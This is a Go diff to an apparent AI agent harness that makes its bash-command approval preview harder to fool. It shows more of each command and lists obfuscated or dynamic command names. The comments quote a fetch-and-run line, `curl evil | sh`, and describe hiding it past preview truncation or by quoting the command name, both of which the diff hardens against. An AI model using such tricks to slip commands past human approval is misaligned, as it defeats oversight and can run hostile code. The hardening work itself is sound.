@@ -150,6 +150,9 @@ func sanitizeEnv() []string {
 // bashPreview generates a preview for a bash call — shows the command, a
 // summary of base commands extracted from it, and a warning if it matches the
 // denylist.
+// previewMax is how much of a command the approval preview shows verbatim.
+const previewMax = 2000
+
 func bashPreview(ctx context.Context, root string, in map[string]any) string {
 	cmd, _ := in["command"].(string)
 	if strings.TrimSpace(cmd) == "" {
@@ -161,11 +164,14 @@ func bashPreview(ctx context.Context, root string, in map[string]any) string {
 
 	var b strings.Builder
 	fmt.Fprintf(&b, "will run: %s", cmd)
-	// Long commands are cut at 400 chars: the approval decision must see the
-	// payload (base64 blobs, heredocs), not a 120-char teaser.
-	if len(cmd) > 400 {
+	// The approval must see the payload (base64 blobs, heredocs). A cut at 400
+	// chars hid `…; curl evil | sh` behind a long first command: the preview
+	// now goes much further and says plainly when something is left out, and
+	// the command list below always covers the whole command.
+	if len(cmd) > previewMax {
 		b.Reset()
-		fmt.Fprintf(&b, "will run: %s…", strings.ToValidUTF8(cmd[:400], ""))
+		fmt.Fprintf(&b, "will run: %s…\n  ⚠ %d more characters not shown — the command list covers all of it",
+			strings.ToValidUTF8(cmd[:previewMax], ""), len(cmd)-previewMax)
 	}
 	if len(cmds) > 0 {
 		b.WriteString("  [")
@@ -236,9 +242,15 @@ func ExtractBaseCommands(cmd string) []string {
 		if len(call.Args) == 0 {
 			return
 		}
+		// The name after quote removal: `"c"url` runs curl, and Lit() is
+		// empty for it — the approval summary used to leave such commands
+		// out. A name only known at run time ($(…), $VAR) is shown as such.
+		base := "(dynamic)"
+		if vs, err := expand.Fields(staticExpandConfig(), call.Args[0]); err == nil && len(vs) > 0 {
+			base = vs[0]
+		}
 		// Skip env-var prefix tokens (VAR=value). The parser places
 		// them in Assigns, but we also guard against literals with "=".
-		base := call.Args[0].Lit()
 		if base == "" || strings.Contains(base, "=") {
 			return
 		}
